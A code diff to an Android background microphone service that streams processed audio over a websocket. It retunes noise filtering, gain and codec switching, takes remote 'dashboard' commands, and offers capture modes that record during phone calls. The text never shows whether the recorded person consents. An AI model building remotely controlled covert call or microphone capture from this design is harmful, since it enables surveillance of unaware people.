@@ -153,7 +153,8 @@ class MicService : Service() {
     @Volatile private var callCaptureMode = "mic" // mic | speaker | earpiece
     @Volatile private var earpieceBoostMode = "off" // off | low | medium | high
     @Volatile private var callAecMode = "auto" // auto | on | off
-    @Volatile private var softwareGainMultiplier = 1.6 // Remote-adjustable gain boost (1.0 = default, 2.0 = 2x louder)
+    @Volatile private var agcMode = "auto" // auto | on | off
+    @Volatile private var softwareGainMultiplier = 1.15 // Clean speech default; far mode caps the effective gain.
     @Volatile private var lowNetworkMode = false // dashboard forced low-network mode
     @Volatile private var lowNetworkSampleRate = 16000 // dynamic: 16000 (normal/low-network clarity mode)
     @Volatile private var lowNetworkFrameMs = 20 // dynamic: 20ms (normal) or 30ms (weak network)
@@ -166,6 +167,14 @@ class MicService : Service() {
     @Volatile private var imageQueueDepth = 0
     @Volatile private var audioDropCount = 0L
     @Volatile private var silenceDropCount = 0L
+    @Volatile private var audioFramesSent = 0L
+    @Volatile private var audioFramesDropped = 0L
+    @Volatile private var wsBufferedBytes = 0L
+    @Volatile private var noiseGateActive = false
+    @Volatile private var cleanFarVoiceActive = false
+    private var codecLowNetworkUntilMs = 0L
+    private var codecStableSinceMs = 0L
+    private var codecLowNetworkActive = false
     private var silenceGateFrames = 0
     private var speechHangoverFrames = 0
     private var lastSilenceKeepaliveAt = 0L
@@ -265,13 +274,14 @@ class MicService : Service() {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                 intArrayOf(
                     MediaRecorder.AudioSource.VOICE_RECOGNITION,
-                    MediaRecorder.AudioSource.UNPROCESSED, // Raw audio, no hardware gating
-                    MediaRecorder.AudioSource.MIC          // Standard fallback
+                    MediaRecorder.AudioSource.MIC,
+                    MediaRecorder.AudioSource.CAMCORDER
                 )
             } else {
                 intArrayOf(
                     MediaRecorder.AudioSource.VOICE_RECOGNITION,
-                    MediaRecorder.AudioSource.MIC
+                    MediaRecorder.AudioSource.MIC,
+                    MediaRecorder.AudioSource.CAMCORDER
                 )
             }
         }
@@ -340,6 +350,7 @@ class MicService : Service() {
         // Audio codec identifiers
         const val AUDIO_CODEC_PCM16_16K: Byte = 0x00  // Full quality - no compression
         const val AUDIO_CODEC_MULAW_8K: Byte = 0x01   // Compressed fallback
+        const val AUDIO_SEND_QUEUE_MAX = 5
         
         const val WS_RECONNECT_BASE_MS = 500L     // Fast initial retry (was 2000)
         const val WS_RECONNECT_MAX_MS = 30_000L   // Max delay 30s (was 5s)
@@ -810,7 +821,8 @@ class MicService : Service() {
                 callCaptureMode = prefs.getString("session_call_capture_mode", "mic") ?: "mic"
                 earpieceBoostMode = prefs.getString("session_earpiece_boost", "off") ?: "off"
                 callAecMode = prefs.getString("session_call_aec_mode", "auto") ?: "auto"
-                softwareGainMultiplier = prefs.getFloat("session_gain", 1.6f).toDouble()
+                agcMode = prefs.getString("session_agc_mode", "auto") ?: "auto"
+                softwareGainMultiplier = prefs.getFloat("session_gain", 1.15f).toDouble()
                 lowNetworkMode = prefs.getBoolean("session_low_network", false)
                 wsStreamMode = prefs.getString("session_stream_codec", "auto") ?: "auto"
                 Log.i(TAG, "Session restored: streaming=$wasStreaming profile=$voiceProfile gain=$softwareGainMultiplier lowNet=$lowNetworkMode codec=$wsStreamMode")
@@ -1674,11 +1686,15 @@ class MicService : Service() {
                     sendCommandAck("set_low_network", detail = if (enabled) "on" else "off")
                 }
                 "voice_profile" -> {
-                    val profile = obj.optString("profile", "room").trim().lowercase()  // Bug 5.1: Add .trim()
-                    voiceProfile = when (profile) {
+                    val profile = obj.optString("profile", "near").trim().lowercase()  // Bug 5.1: Add .trim()
+                    val nextProfile = when (profile) {
                         "near" -> "near"
                         "far" -> "far"
                         else -> "room"
+                    }
+                    if (nextProfile != voiceProfile) {
+                        voiceProfile = nextProfile
+                        resetEnhancerState()
                     }
                     // BUG-R10: Persist so restarts restore last chosen profile
                     prefs.edit().putString("session_voice_profile", voiceProfile).apply()
@@ -1732,6 +1748,19 @@ class MicService : Service() {
                     }
                     sendHealthStatus("call_aec_$callAecMode")
                     sendCommandAck("call_aec_mode", detail = callAecMode)
+                }
+                "agc_mode" -> {
+                    val mode = obj.optString("mode", "auto").trim().lowercase()
+                    agcMode = when (mode) {
+                        "on", "off" -> mode
+                        else -> "auto"
+                    }
+                    prefs.edit().putString("session_agc_mode", agcMode).apply()
+                    if (isCapturing || isCapturingGuard.get()) {
+                        rebuildAudioRecordForCallRoute("agc_mode_changed")
+                    }
+                    sendHealthStatus("agc_$agcMode")
+                    sendCommandAck("agc_mode", detail = agcMode)
                 }
                 "set_gain" -> {
                     val level = obj.optDouble("level", 1.0).coerceIn(0.5, 5.0)
@@ -3065,6 +3094,7 @@ class MicService : Service() {
             
             // HQ Buffered Mode Removed (Issue M-08)
             var rotateSourceOnExit = false
+            var audioSenderJob: Job? = null
             try {
                 audioRecord = createAudioRecordWithFallback()
 
@@ -3082,6 +3112,32 @@ class MicService : Service() {
                 Log.i(TAG, "🎙️ Audio capture started (${sampleRate}Hz, PCM16, mono)")
                 sendHealthStatus("mic_started")
 
+                val audioSendQueue = ArrayDeque<ByteString>(AUDIO_SEND_QUEUE_MAX)
+                val audioSendMutex = Mutex()
+                audioSenderJob = launch(Dispatchers.IO) {
+                    while (isActive && isCapturing) {
+                        val frame = audioSendMutex.withLock {
+                            if (audioSendQueue.isEmpty()) null else audioSendQueue.removeFirst()
+                        }
+                        if (frame == null) {
+                            delay(2)
+                            continue
+                        }
+                        if (safeSend(frame)) {
+                            audioFramesSent++
+                            lastAudioChunkSentAt = System.currentTimeMillis()
+                            lastAudioChunkSentAtMs = lastAudioChunkSentAt
+                            if (lastAudioChunkSentAt - lastPingSentAt >= 10_000) {
+                                lastPingSentAt = lastAudioChunkSentAt
+                                sendHealthStatus("audio_tick")
+                            }
+                        } else {
+                            Log.w(TAG, "Audio sender failed - stopping capture for reconnect")
+                            isCapturing = false
+                            break
+                        }
+                    }
+                }
                 var chunk = ByteArray(audioReadBufferSize.coerceAtLeast(streamChunkSize))
                 var consecutiveReadErrors = 0
                 var nearSilentFrames = 0
@@ -3172,12 +3228,13 @@ class MicService : Service() {
                         // OkHttp cannot remove already-queued frames, so keep the queue tiny
                         // by dropping new realtime audio as soon as it starts backing up.
                         val qSize = activeWebSocket?.queueSize() ?: 0L
-                        if (qSize > 16_000L) {
+                        wsBufferedBytes = qSize
+                        if (qSize > 24_000L) {
                             if (!isNetworkLagging) {
                                 Log.w(TAG, "Network lagging! WS queue size: $qSize bytes. Forcing µ-law & 40ms chunks.")
                                 isNetworkLagging = true
                             }
-                        } else if (qSize < 6_000L) {
+                        } else if (qSize < 4_000L) {
                             isNetworkLagging = false
                         }
 
@@ -3193,13 +3250,19 @@ class MicService : Service() {
                         val pcmData = applyFarVoiceGain(chunk, targetChunkSize, willBeMuLaw)
 
                         val nowMs = System.currentTimeMillis()
-                        val rawSpeech = rms > 420.0 || peakAbs > 1800
+                        val isFarProfile = voiceProfile == "far"
+                        val rawSpeech = if (isFarProfile) {
+                            (peakAbs > 800 && rms > 100.0) || rms > 600.0
+                        } else {
+                            (peakAbs > 1300 && rms > 160.0) || rms > 900.0
+                        }
                         speechHangoverFrames = if (rawSpeech) {
-                            if (isEffectiveLowNetworkMode()) 6 else 10
+                            if (isEffectiveLowNetworkMode()) 6 else if (voiceProfile == "far") 14 else 10
                         } else {
                             (speechHangoverFrames - 1).coerceAtLeast(0)
                         }
                         val likelySpeech = rawSpeech || speechHangoverFrames > 0
+                        noiseGateActive = !likelySpeech
                         silenceGateFrames = if (likelySpeech) 0 else silenceGateFrames + 1
                         val silenceKeepaliveMs = if (isEffectiveLowNetworkMode()) 1_200L else 650L
                         val dropSilence = silenceGateFrames > 16 && nowMs - lastSilenceKeepaliveAt < silenceKeepaliveMs
@@ -3212,10 +3275,6 @@ class MicService : Service() {
                             }
                         } else {
                             if (!likelySpeech) lastSilenceKeepaliveAt = nowMs
-                            val delayMs = nextAudioFrameDueAt - System.currentTimeMillis()
-                            if (delayMs > 0) {
-                                delay(delayMs.coerceAtMost(currentFrameMs.toLong()))
-                            }
                             nextAudioFrameDueAt = System.currentTimeMillis() + currentFrameMs
 
                             // Issue A: Inline encoding - no second chooseWsFallbackCodec() call
@@ -3224,17 +3283,13 @@ class MicService : Service() {
                             encoded[0] = 0x4D.toByte(); encoded[1] = 0x4D.toByte()
                             encoded[2] = 0x01; encoded[3] = codec
                             System.arraycopy(payload, 0, encoded, 4, payload.size)
-                            if (safeSend(encoded.toByteString())) {
-                                lastAudioChunkSentAt = System.currentTimeMillis()
-                                lastAudioChunkSentAtMs = lastAudioChunkSentAt
-                                if (lastAudioChunkSentAt - lastPingSentAt >= 10_000) {
-                                    lastPingSentAt = lastAudioChunkSentAt
-                                    sendHealthStatus("audio_tick")
+                            audioSendMutex.withLock {
+                                if (audioSendQueue.size >= AUDIO_SEND_QUEUE_MAX) {
+                                    audioSendQueue.removeFirst()
+                                    audioDropCount++
+                                    audioFramesDropped++
                                 }
-                            } else {
-                                Log.w(TAG, "Audio send failed - stopping capture for reconnect")
-                                isCapturing = false
-                                break
+                                audioSendQueue.addLast(encoded.toByteString())
                             }
                         }
                     } else if (read < 0) {
@@ -3295,6 +3350,8 @@ class MicService : Service() {
             } finally {
                 val wasCapturing = isCapturing
                 isCapturing = false
+                audioSenderJob?.cancel()
+                audioSenderJob = null
                 val stoppedExternally = audioCaptureStoppedExternally.getAndSet(false)
                 val rec = audioRecord
                 if (rec != null) {
@@ -3413,7 +3470,7 @@ class MicService : Service() {
                             acousticEchoCanceler?.enabled = when (callAecMode) {
                                 "on" -> true
                                 "off" -> false
-                                else -> !(callActive && callCaptureMode == "earpiece" && earpieceBoostMode != "off")
+                                else -> callActive && callCaptureMode == "speaker"
                             }
                         } catch (e: Exception) {
                             Log.w(TAG, "AcousticEchoCanceler init failed: ${e.message}")
@@ -3422,7 +3479,11 @@ class MicService : Service() {
                     if (AutomaticGainControl.isAvailable()) {
                         try {
                             automaticGainControl = AutomaticGainControl.create(sessionId)
-                            automaticGainControl?.enabled = true
+                            automaticGainControl?.enabled = when (agcMode) {
+                                "on" -> true
+                                "off" -> false
+                                else -> voiceProfile == "room" && !isDeviceInCall()
+                            }
                         } catch (e: Exception) {
                             Log.w(TAG, "AutomaticGainControl init failed: ${e.message}")
                         }
@@ -3460,13 +3521,20 @@ class MicService : Service() {
         speechHangoverFrames = 0
         lastSilenceKeepaliveAt = 0L
         nextAudioFrameDueAt = 0L
+        noiseGateActive = false
+        audioFramesSent = 0L
+        audioFramesDropped = 0L
+        wsBufferedBytes = 0L
+        codecLowNetworkActive = false
+        codecLowNetworkUntilMs = 0L
+        codecStableSinceMs = 0L
         // Start neutral to avoid startup overdrive from stacked userGain × prime gain.
         smoothedGain = 1.0
         spectralDenoiser.reset()
         // BUG-M3 fix: Reduced warmup from 30-50 to 10-15 chunks (200-300ms).
         // The spectral denoiser's own noiseAdaptFrames>=10 guard already prevents
         // premature subtraction, making the long warmup redundant.
-        realtimeDenoiserWarmupChunksRemaining = if (voiceProfile == "far") 15 else 10
+        realtimeDenoiserWarmupChunksRemaining = if (voiceProfile == "far") 12 else 8
     }
 
     /**
@@ -3487,17 +3555,15 @@ class MicService : Service() {
     private fun applyFarVoiceGain(buf: ByteArray, len: Int, willBeMuLaw: Boolean = false): ByteArray {
         if (len < 2) return buf.copyOf(len)
         val samples = len / 2
-        val strongAi = aiEnhancementEnabled
-        val p = voiceProfile
+        val profile = voiceProfile
+        cleanFarVoiceActive = profile == "far"
         val callActive = isDeviceInCall()
         val earpieceBoostActive = callActive && callCaptureMode == "earpiece" && earpieceBoostMode != "off"
         val speakerCaptureActive = callActive && callCaptureMode == "speaker"
-        // Issue A: willBeMuLaw now passed by caller (single codec decision per chunk)
 
         val inWarmup = realtimeDenoiserWarmupChunksRemaining > 0
         if (realtimeDenoiserWarmupChunksRemaining > 0) realtimeDenoiserWarmupChunksRemaining--
 
-        // ── Decode PCM-16 LE → double working buffer ─────────────────────────
         val work = DoubleArray(samples)
         for (i in 0 until samples) {
             val lo = buf[i * 2].toInt() and 0xFF
@@ -3505,220 +3571,151 @@ class MicService : Service() {
             work[i] = ((hi shl 8) or lo).toShort().toDouble()
         }
 
-        // ── Stage 1: High-pass filter (profile-aware, adaptive) ──────────────
-        val noisyEnv = estimatedNoiseDb > -54.0
-        
-        // SENIOR DEV FIX: Lower alpha = higher cutoff frequency.
-        // 0.9150 pushes the cutoff to ~250Hz. This completely strips the 
-        // heavy low-end rumble of coolers and exhaust fans before the gain stage.
+        // DC blocker + strong rumble high-pass. Lower alpha means higher cutoff.
         val hpAlpha = when {
-            earpieceBoostActive -> 0.9300
-            speakerCaptureActive -> 0.9350
-            else -> when (p) {
-            "far"  -> if (noisyEnv) 0.9150 else 0.9550
-            "near" -> if (noisyEnv) 0.9420 else 0.9500
-            else   -> if (noisyEnv) 0.9580 else 0.9650
-            }
+            earpieceBoostActive -> 0.928  // ~190Hz
+            speakerCaptureActive -> 0.934
+            profile == "far" -> 0.924     // ~200Hz: strongest rumble cleanup
+            profile == "room" -> 0.942    // ~150Hz: balanced room cleanup
+            else -> 0.953                  // ~120Hz: keep nearby voice natural
         }
         for (i in 0 until samples) {
             val x = work[i]
             val y = hpAlpha * (hpfPrevY + x - hpfPrevX)
-            hpfPrevX = x; hpfPrevY = y
+            hpfPrevX = x
+            hpfPrevY = y
             work[i] = y
         }
 
-        // ── Stage 1b: Low-pass filter (Hiss Killer) ──────────────
-        // SENIOR DEV FIX: Smoothly roll off frequencies above ~6kHz. 
-        // This erases the "white noise" hiss of exhaust fans without affecting speech.
-        val lpAlpha = 0.65 
+        // Gentle low-pass around speech top end. This reduces fan air/hiss without watery artifacts.
+        val lpAlpha = when {
+            willBeMuLaw -> 0.56
+            profile == "far" -> 0.60
+            profile == "room" -> 0.66
+            else -> 0.74
+        }
         for (i in 0 until samples) {
-            val x = work[i]
-            val y = lpfPrevY + lpAlpha * (x - lpfPrevY)
-            lpfPrevX = x; lpfPrevY = y
+            val y = lpfPrevY + lpAlpha * (work[i] - lpfPrevY)
+            lpfPrevX = work[i]
+            lpfPrevY = y
             work[i] = y
         }
 
-        // ── Stage 2a: Presence EQ @ 2.2 kHz (subtle pre-gain shaping) ──
+        // Presence band: light 900Hz-3.2kHz speech lift, never bass boost.
         val eq1b0 = 1.1356685
         val eq1b1 = -0.9976115
         val eq1b2 = 0.4004227
         val eq1a1 = -0.9976115
         val eq1a2 = 0.5360913
+        val presenceWet = when {
+            earpieceBoostActive -> 0.26
+            speakerCaptureActive -> 0.20
+            profile == "far" -> 0.26
+            profile == "room" -> 0.18
+            else -> 0.08
+        }
         for (i in 0 until samples) {
             val x = work[i]
             val y = eq1b0 * x + eq1b1 * eq1X1 + eq1b2 * eq1X2 - eq1a1 * eq1Y1 - eq1a2 * eq1Y2
-            eq1X2 = eq1X1
-            eq1X1 = x
-            eq1Y2 = eq1Y1
-            eq1Y1 = y
-            val wet = when {
-                earpieceBoostActive -> when (earpieceBoostMode) {
-                    "high" -> 0.52
-                    "medium" -> 0.44
-                    else -> 0.34
-                }
-                speakerCaptureActive -> 0.30
-                else -> when (p) {
-                "near" -> if (strongAi) 0.22 else 0.16
-                "far" -> if (strongAi) 0.35 else 0.25
-                else -> if (strongAi) 0.16 else 0.12
-                }
-            }
-            work[i] = x * (1.0 - wet) + y * wet
+            eq1X2 = eq1X1; eq1X1 = x
+            eq1Y2 = eq1Y1; eq1Y1 = y
+            work[i] = x * (1.0 - presenceWet) + y * presenceWet
         }
 
-        // ── Stage 3: Spectral denoise ──
+        // Moderate stationary-noise reduction. Blend some original back to avoid robotic/watery sound.
+        val preDenoise = work.copyOf()
         if (inWarmup) {
             spectralDenoiser.denoise(work.copyOf())
         } else {
-            // NEW-3: For MuLaw path, still denoise but skip the far/near blend.
-            // The blend preserves original high-freq detail that gets decimated away anyway.
-            val preDenoise = if ((p == "far" || p == "near") && !willBeMuLaw) work.copyOf() else null
             spectralDenoiser.denoise(work)
-            if (preDenoise != null) {
-                // SENIOR DEV FIX: Stop bleeding raw fan noise back into the mix.
-                // Dropped from 0.20 to 0.02 (2%) when it's noisy. Let the denoiser do its job.
-                val blendOriginal = when (p) {
-                    "far" -> if (estimatedNoiseDb > -56.0) 0.02 else 0.35
-                    "near" -> 0.40
-                    else -> 0.40
-                }
-                for (i in 0 until samples) {
-                    work[i] = preDenoise[i] * blendOriginal + work[i] * (1.0 - blendOriginal)
-                }
-            }
-        }
-
-        // ── Stage 2b: High-shelf @ ~3.5 kHz ─────────────────────────────────
-        if (earpieceBoostActive || speakerCaptureActive || p == "far" || (p == "near" && !willBeMuLaw)) {
-            val hfGain = when {
-                earpieceBoostActive -> when (earpieceBoostMode) {
-                    "high" -> 1.45
-                    "medium" -> 1.32
-                    else -> 1.20
-                }
-                speakerCaptureActive -> 1.18
-                else -> when (p) {
-                "far" -> if (willBeMuLaw) {
-                    if (strongAi) 1.14 else 1.08
-                } else {
-                    if (strongAi) 1.35 else 1.20
-                }
-                "near" -> if (strongAi) 1.18 else 1.10
-                else -> 1.08
-                }
-            }
-            val hfAlpha = 0.15
-            var prevOut = hfShelfPrevOut
-            if (hfShelfNeedsPrime && samples > 0) {
-                prevOut = work[0]
-                hfShelfNeedsPrime = false
+            val denoiseWet = when {
+                profile == "far" -> if (estimatedNoiseDb > -54.0) 0.62 else 0.48
+                profile == "room" -> if (estimatedNoiseDb > -54.0) 0.42 else 0.32
+                else -> 0.20
             }
             for (i in 0 until samples) {
-                val highFreq = work[i] - prevOut
-                prevOut = prevOut + hfAlpha * (work[i] - prevOut)
-                work[i] = prevOut + highFreq * hfGain
+                work[i] = preDenoise[i] * (1.0 - denoiseWet) + work[i] * denoiseWet
             }
-            hfShelfPrevOut = prevOut
         }
 
-        // ── Stage 4: Adaptive gain with Downward Expansion (Noise Gate) ──
         var sumSq = 0.0
-        for (v in work) sumSq += v * v
+        var peakAbs = 1.0
+        for (v in work) {
+            sumSq += v * v
+            val a = kotlin.math.abs(v)
+            if (a > peakAbs) peakAbs = a
+        }
         val rms = Math.sqrt(sumSq / samples).coerceAtLeast(1.0)
-        
-        // Calculate Signal-to-Noise Ratio (SNR)
         val rmsDb = 20.0 * Math.log10(rms / 32768.0)
         val snr = rmsDb - estimatedNoiseDb
+        val snrFactor = (snr.coerceIn(0.0, 18.0) / 18.0)
 
-        val gainCeil = when {
-            earpieceBoostActive -> when (earpieceBoostMode) {
-                "high" -> 11.0
-                "medium" -> 8.0
-                else -> 5.5
-            }
-            speakerCaptureActive -> 5.0
-            willBeMuLaw -> 4.0
-            p == "far" -> if (strongAi) 9.0 else 7.0
-            else -> if (strongAi) 8.0 else 6.0
+        val targetRms = when {
+            earpieceBoostActive -> 8000.0
+            speakerCaptureActive -> 7000.0
+            profile == "far" -> 6200.0
+            profile == "room" -> 5600.0
+            else -> 5000.0
         }
-        
-        val baseGainTarget = when {
-            earpieceBoostActive -> when (earpieceBoostMode) {
-                "high" -> 24000.0
-                "medium" -> 20500.0
-                else -> 17500.0
-            }
-            speakerCaptureActive -> 15500.0
-            willBeMuLaw -> 14000.0
-            p == "far" -> if (strongAi) 22000.0 else 19000.0
-            else -> if (strongAi) 19000.0 else 16500.0
+        val adaptiveCeil = when {
+            earpieceBoostActive -> 3.2
+            speakerCaptureActive -> 2.2
+            profile == "far" -> 1.8
+            profile == "room" -> 1.5
+            else -> 1.2
         }
-
-        // Continuous soft expander. Keep a real floor so speech does not jump up
-        // from near-mute; hard expansion made first words hard to understand.
-        val snrFactor = snr.coerceIn(0.0, 15.0) / 15.0
-        val expanderFloor = when {
-            earpieceBoostActive -> 0.34
-            speakerCaptureActive -> 0.28
-            willBeMuLaw || isEffectiveLowNetworkMode() -> 0.24
-            else -> 0.18
+        val noiseFloorGain = when {
+            profile == "far" -> 0.72 + snrFactor * 0.28
+            profile == "room" -> 0.78 + snrFactor * 0.22
+            else -> 0.88 + snrFactor * 0.12
         }
-        val expanderMultiplier = expanderFloor + ((1.0 - expanderFloor) * snrFactor)
+        val rawGain = ((targetRms / rms) * noiseFloorGain).coerceIn(0.75, adaptiveCeil)
 
-        val effectiveGainTarget = baseGainTarget * expanderMultiplier
-        val rawGain = (effectiveGainTarget / rms).coerceIn(1.0, gainCeil)
-
-        // Smooth AGC dynamics: quick enough for speech, slow enough to avoid pumping.
+        // Increase slowly for far voices; decrease quickly on loud bursts to avoid clipping/pumping.
         smoothedGain = if (rawGain > smoothedGain) {
-            smoothedGain * 0.90 + rawGain * 0.10
+            smoothedGain * (if (profile == "far") 0.96 else 0.97) + rawGain * (if (profile == "far") 0.04 else 0.03)
         } else {
-            smoothedGain * 0.975 + rawGain * 0.025
+            smoothedGain * (if (profile == "far") 0.55 else 0.65) + rawGain * (if (profile == "far") 0.45 else 0.35)
         }
 
-        val userGain = softwareGainMultiplier.coerceIn(0.5, 5.0)
-        
-        val maxCombined = when {
-            earpieceBoostActive -> when (earpieceBoostMode) {
-                "high" -> 9.0
-                "medium" -> 7.0
-                else -> 5.0
-            }
-            speakerCaptureActive -> 4.5
-            willBeMuLaw -> 4.5
-            p == "far" -> if (strongAi) 8.0 else 6.0
-            else -> 6.0
+        val cleanUserGain = when {
+            earpieceBoostActive -> softwareGainMultiplier.coerceIn(0.75, 2.0)
+            profile == "far" -> softwareGainMultiplier.coerceIn(0.85, 1.3)
+            profile == "room" -> softwareGainMultiplier.coerceIn(1.0, 1.5)
+            else -> softwareGainMultiplier.coerceIn(1.0, 1.2)
         }
-        var peakAbs = 1.0
-        for (i in 0 until samples) {
-            val abs = kotlin.math.abs(work[i])
-            if (abs > peakAbs) peakAbs = abs
-        }
-        // Fix: Smoothly clamp the maximum possible gain so peaks don't exceed 40,000 before
-        // hitting the soft limiter. Prevents sudden volume ducking/cutting when someone shouts.
-        val maxSafeGain = 40_000.0 / peakAbs.coerceAtLeast(1.0)
-        val combinedGain = (smoothedGain * userGain).coerceIn(0.75, min(maxCombined * userGain, maxSafeGain))
+        val maxSafeGain = 28_000.0 / peakAbs.coerceAtLeast(1.0)
+        val combinedGain = (smoothedGain * cleanUserGain).coerceIn(0.70, min(adaptiveCeil, maxSafeGain))
         for (i in 0 until samples) work[i] *= combinedGain
 
-        // ── Stage 5: Soft peak limiter + encode PCM-16 LE ────────────────────
         val out = ByteArray(len)
         for (i in 0 until samples) {
             val limited = softPeakLimit(work[i])
-            val clamped = limited.toInt().coerceIn(-32768, 32767)
-            out[i * 2]     = (clamped and 0xFF).toByte()
+            val clamped = limited.toInt().coerceIn(-32760, 32760)
+            out[i * 2] = (clamped and 0xFF).toByte()
             out[i * 2 + 1] = ((clamped shr 8) and 0xFF).toByte()
         }
         return out
     }
-
     // Bug L2: encodeWsFallbackAudio removed — dead code. Audio encoding is inlined in capture loop.
 
     private fun chooseWsFallbackCodec(): Byte {
-        // Keep PCM16 on normal links; switch to µ-law 8k only when the link is
-        // explicitly constrained or the websocket queue shows realtime lag.
-        return if (isEffectiveLowNetworkMode()) AUDIO_CODEC_MULAW_8K else AUDIO_CODEC_PCM16_16K
+        val now = SystemClock.elapsedRealtime()
+        val constrained = isEffectiveLowNetworkMode() || wsBufferedBytes > 24_000L
+        if (constrained) {
+            codecLowNetworkActive = true
+            codecLowNetworkUntilMs = now + 5_000L
+            codecStableSinceMs = 0L
+            return AUDIO_CODEC_MULAW_8K
+        }
+        if (codecLowNetworkActive) {
+            if (now < codecLowNetworkUntilMs) return AUDIO_CODEC_MULAW_8K
+            if (codecStableSinceMs == 0L) codecStableSinceMs = now
+            if (now - codecStableSinceMs < 10_000L) return AUDIO_CODEC_MULAW_8K
+            codecLowNetworkActive = false
+        }
+        return AUDIO_CODEC_PCM16_16K
     }
-
     /**
      * 16 kHz PCM → low-pass + 2:1 decimate → 8 kHz-equivalent samples, then µ-law.
      * Keeps codec bandwidth and sample counts consistent with server 8 kHz playback.
@@ -3807,12 +3804,8 @@ class MicService : Service() {
         // Queue of samples that are ready to be delivered to the caller
         private val readyOut = ArrayDeque<Double>(FRAME * 4)
 
-        // Noise power spectrum (one value per positive frequency bin)
-        // Conservative start for noisy environments; then adapt quickly during bootstrap.
         private val noisePow = DoubleArray(BINS) { 1e6 }
-        /** FFT frames processed (always increments). */
         private var fftFramesProcessed = 0
-        /** Frames where noise estimate was updated from quiet content only. */
         private var noiseAdaptFrames = 0
 
         fun reset() {
@@ -3825,10 +3818,6 @@ class MicService : Service() {
             noiseAdaptFrames = 0
         }
 
-        /**
-         * Process [samples] in-place.  Always writes exactly [samples].size values
-         * back into the array (zero-padded for the very first partial frame).
-         */
         fun denoise(samples: DoubleArray) {
             val n   = samples.size
             val out = DoubleArray(n)
@@ -3887,15 +3876,15 @@ class MicService : Service() {
                 
                 // SENIOR DEV FIX: Dialed back from 3.5 to 2.8. 
                 // Suppresses heavy fans without chewing up the fragile formants of far-away voices.
-                val OVER  = if (strongDenoise) 2.8 else 1.8 
+                val OVER  = if (strongDenoise) 1.75 else 1.35
                 
                 // Crush the noise floor down safely
                 val adaptiveFloor = when {
-                    estimatedNoiseDb > -45.0 -> 0.005 // Extreme noise 
-                    estimatedNoiseDb > -55.0 -> 0.01  // Heavy noise
-                    else -> 0.02
+                    estimatedNoiseDb > -45.0 -> 0.05
+                    estimatedNoiseDb > -55.0 -> 0.08
+                    else -> 0.12
                 }
-                val FLOOR = if (strongDenoise) adaptiveFloor else 0.10
+                val FLOOR = if (strongDenoise) adaptiveFloor else 0.18
 
                 // Step 1: Calculate raw suppression scales for all bins
                 val rawScales = DoubleArray(BINS)
@@ -3987,7 +3976,7 @@ class MicService : Service() {
      * Prevents hard digital clipping without audible distortion.
      */
     private fun softPeakLimit(x: Double): Double {
-        val knee = 31000.0 // Catch true peaks only; normal speech stays linear
+        val knee = if (cleanFarVoiceActive) 28000.0 else 31000.0
         val ceil = 32767.0
         val abs  = Math.abs(x)
         if (abs <= knee) return x
@@ -4118,10 +4107,13 @@ class MicService : Service() {
             put("appVersionCode", BuildConfig.VERSION_CODE)
             put("streamCodecMode", wsStreamMode)
             put("streamCodec", if (lastCodecChoice == AUDIO_CODEC_MULAW_8K) "smart" else "pcm")
+            put("codec", if (lastCodecChoice == AUDIO_CODEC_MULAW_8K) "mulaw8k" else "pcm16")
             put("voiceProfile", voiceProfile)
+            put("cleanFarVoice", cleanFarVoiceActive)
             put("callCaptureMode", callCaptureMode)
             put("earpieceBoost", earpieceBoostMode)
             put("callAecMode", callAecMode)
+            put("agcMode", agcMode)
             put("noiseDb", estimatedNoiseDb)
             put("internetOnline", internetOnline)
             put("callActive", callActive)
@@ -4129,6 +4121,10 @@ class MicService : Service() {
             put("lowNetworkRequested", lowNetworkMode)
             put("networkLagging", isNetworkLagging)
             put("droppingPackets", isNetworkLagging || audioDropCount > 0)
+            put("noiseGateActive", noiseGateActive)
+            put("wsBufferedBytes", wsBufferedBytes)
+            put("audioFramesSent", audioFramesSent)
+            put("audioFramesDropped", audioFramesDropped)
             put("imageUploadStatus", imageUploadStatus)
             put("imageQueued", imageQueueDepth > 0 && !imageTransferActive)
             put("imageUploading", imageTransferActive && imageUploadStatus == "uploading")
@@ -4136,6 +4132,7 @@ class MicService : Service() {
             put("imageQueueDepth", imageQueueDepth)
             put("audioDrops", audioDropCount)
             put("silenceDrops", silenceDropCount)
+            put("silenceFramesDropped", silenceDropCount)
             put("frameMs", currentStreamFrameMs())
             put("streamingMode", "realtime")
             put("gainLevel", softwareGainMultiplier)
